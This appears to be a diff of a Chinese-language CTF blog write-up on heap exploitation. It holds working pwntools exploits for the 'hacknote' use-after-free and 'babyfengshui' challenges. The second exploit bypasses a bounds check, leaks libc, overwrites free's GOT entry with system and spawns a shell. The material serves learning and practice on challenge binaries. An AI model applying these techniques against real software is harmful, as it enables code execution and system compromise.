@@ -260,8 +260,148 @@
 </ul>
 <p>exp 如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Heap-fengshui-babyfengshui"><a href="#Heap-fengshui-babyfengshui" class="headerlink" title="Heap fengshui - babyfengshui"></a>Heap fengshui - babyfengshui</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">char</span> *)(txt_len + *(_DWORD *)users_array[idx]) &gt;= (<span class="keyword">char</span> *)users_array[idx] - <span class="number">4</span> ) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>还没看明白…</p>
+<h3 id="Heap-fengshui-babyfengshui"><a href="#Heap-fengshui-babyfengshui" class="headerlink" title="Heap fengshui - babyfengshui"></a>Heap fengshui - babyfengshui</h3><p>Node 大致是这样的：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Node</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">char* dect</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">char name[0x80-sizeof(char*)]</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">char</span> *)(len + users_array[idx]-&gt;dect) &gt;=</span><br><span class="line">    (<span class="keyword">char</span> *)users_array[idx] - <span class="number">4</span> ) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个只能判断 node 和 dect 相邻时，dect 不溢出，可以把他们操作成不相邻的，就绕过这个检测了。</p>
+<p>然后这么操作:</p>
+<ol>
+<li>create 三个 0x80 的 node.</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">node</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">top</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[0] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[0] 0x80</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ol start="2">
+<li>delete node[0].</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">node</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">top</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">空闲    0x100</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ol start="3">
+<li>再 create 一个 0x100 dect 的 node, 此时 dect 和 node 就不在一起了.</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">node</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">top</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[3] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[2] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">node[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[1] 0x80</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:center">dect[3] 0x100</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ol start="4">
+<li>用堆溢出进行操作.</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh  = process(<span class="string">'./babyfengshui'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, name, textLen, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size of description:'</span>,str(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,textLen,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk0'</span>, <span class="number">0x80</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk1'</span>, <span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk2'</span>, <span class="number">0x8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'chunk3'</span>, <span class="number">0x19c</span>,</span><br><span class="line">       <span class="string">'c'</span> * <span class="number">0x198</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, free_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 libc 加载地址</span></span><br><span class="line">libc_base   = free_addr - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 free 的 got 表地址为 system 的地址</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">4</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell，相当于 system(heap[2])</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>libc2.26 以上因为有 tcache 机制，使用单项链表维护，先进后出，而且块不会合并。</p>
 
       
       
